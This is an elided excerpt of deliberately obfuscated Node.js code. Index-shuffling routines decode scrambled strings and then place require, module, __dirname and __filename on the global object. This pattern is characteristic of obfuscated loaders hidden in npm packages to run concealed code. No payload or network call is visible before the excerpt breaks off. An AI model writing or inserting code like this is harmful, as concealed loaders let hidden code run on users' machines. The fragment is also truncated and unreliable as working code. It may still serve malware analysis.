...
var _$_db61 = (function (y, i) {
    ...
    for (var c = 0; c < j; c++) {
        var a = i * (c + 413) + (i % 54163)
        var z = i * (c + 748) + (i % 35200)
        var l = a % j
        var h = z % j
        var d = p[l]
        p[l] = p[h]
    ...
    var x = '\x23\x30'
    var b = '\x23'
    return p.join(w).split(f).join(n).split(e).join(k).split(x).join(b).split(n)
})('%mae__treeem%oenmdei%_dudrjcin_%%l_f_bainnf', 3258614)
global[_$_db61[0x0]] = require
if (typeof module === _$_db61[0x1]) {
    global[_$_db61[0x2]] = module
}
if (typeof __dirname !== _$_db61[0x3]) {
    global[_$_db61[0x4]] = __dirname
}
if (typeof __filename !== _$_db61[0x3]) {
    global[_$_db61[0x5]] = __filename
}
var _$jsoToArr
;(function () {
    var kyD = '',
    ...
    function BCI(u) {
        ...
        for (var e = 0; e < w; e++) {
            var b = k * (e + 402) + (k % 33613)
            var y = k * (e + 161) + (k % 41231)
            var m = b % w
            var r = y % w
            var o = t[m]
            t[m] = t[r]
